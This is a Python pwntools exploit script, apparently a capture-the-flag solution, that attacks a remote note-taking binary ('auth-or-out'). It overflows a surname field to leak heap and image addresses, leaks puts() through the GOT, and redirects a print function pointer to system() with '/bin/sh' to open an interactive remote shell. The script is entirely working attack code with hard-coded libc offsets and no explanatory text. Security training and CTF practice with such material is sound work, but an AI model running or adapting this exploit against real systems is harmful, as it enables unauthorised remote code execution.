#!/usr/bin/python
from pwn import *
import time
import getopt
import sys

def do_add(name,surname,age,size,note):
    io.sendlineafter(b'Choice:', b'1') 
    io.sendlineafter(b'Name', name)
    io.sendlineafter(b'Surname:', surname)
    io.sendlineafter(b'Age:', age)
    io.sendlineafter(b'size:', size)
    io.sendlineafter(b'Note:', note)
    return

def do_modify(id,name,surname,age):
    io.sendlineafter(b'Choice:', b'2') 
    io.sendlineafter(b'ID', id)
    io.sendlineafter(b'Name', name)
    io.sendlineafter(b'Surname:', surname)
    io.sendlineafter(b'Age:', age)
    return

def do_print(id):
    io.sendlineafter(b'Choice:', b'3') 
    io.sendlineafter(b'ID:', id)
    return

def do_delete(id):
    io.sendlineafter(b'Choice:', b'4') 
    io.sendlineafter(b'ID:', id)
    return

opts,argv=getopt.getopt(sys.argv[1:], 't:p:s:b:')

for k,v in opts:
    if k == '-t':
        target=v
    elif k == '-p':
        port=v
    elif k == '-s':
        puts_system_distance=int(v,16)         
    elif k == '-b':
        binsh_system_distance=int(v,16)  
                            
io=remote(target, port)

#sleep(10)

# Stage 1 - Leak ptr->Note

surname=b"A"*17
do_add(b'1',b'1',b'1',b'8',b'1')
do_modify(b'1',b'2',surname,b'2')
do_print(b'1')

response=str(io.recvuntil(b"AAAAAAAAAAAAAAAA"))
ptr_note=int.from_bytes(io.recvn(6),"little") 

info("ptr->Note is "+hex(ptr_note))

# Stage 2 - Leak ptr->PrintNote

ptr_print=ptr_note-0x08
ptr_binsh=ptr_note+0x48
bin_sh=b"/bin/sh"
do_add(b'2',b'2',b'2',b'8',bin_sh)
do_delete(b'1')

note=b"C"*48
note+=p64(ptr_print)
do_add(b'3',b'3',b'3',b'-1',note)
do_print(b'2')

response=str(io.recvuntil(b"Note: ["))
ptr_print=int.from_bytes(io.recvn(6),"little") 

info("ptr->PrintNote is "+hex(ptr_print))

# Stage 3 - Leak puts() address

base=ptr_print-0x1219
got_puts=base+0x202f90
plt_puts=base+0x07e0

info("Image base is "+hex(base))
info("Puts GOT is "+hex(got_puts))

#exe = './auth-or-out'
#elf = context.binary = ELF(exe, checksec=False)

#info("Pwntools says Puts GOT is "+hex(elf.got.puts))
#info("Pwntools says Puts PLT is "+hex(elf.plt.puts))

note=b"D"*64
note+=p64(plt_puts)
do_add(b'4',b'4',b'4',b'-1',note)

note=b"D"*55
note+=b"\x00"
do_add(b'5',b'5',b'5',b'-1',note)

note=b"E"*48
note+=p64(got_puts)
do_add(b'6',b'6',b'6',b'-1',note)

do_print(b'2')

response=str(io.recvuntil(b"Age: 4919131752989213764\n"))
puts_addr=int.from_bytes(io.recvn(6),"little") 

info("Puts() is "+hex(puts_addr))

# ta_init ( CustomHeap, EndofHeap, 10, 16, 8 ) -> initialise heap linked lists on stack
# Each add_author triggers 2 ta_alloc(), using 2 blocks. Hence limited to 5 authors. 
# We need to delete 3 authors and add them again. 
#
# Stage 4 - Call system() with ptr to "/bin/sh"

#puts_system_distance=0x2d7a0    # Local offset
puts_system_distance=0x31550    # Remote offset  
system_addr=puts_addr-puts_system_distance

do_delete(b'3')
do_delete(b'4')
do_delete(b'5')

note=b"F"*64
note+=p64(system_addr)
do_add(b'4',b'4',b'4',b'-1',note)

note=b"G"*55
note+=b"\x00"
do_add(b'5',b'5',b'5',b'-1',note)

note=b"H"*48
note+=p64(ptr_binsh)
do_add(b'6',b'6',b'6',b'-1',note)
do_print(b'2')

io.interactive()


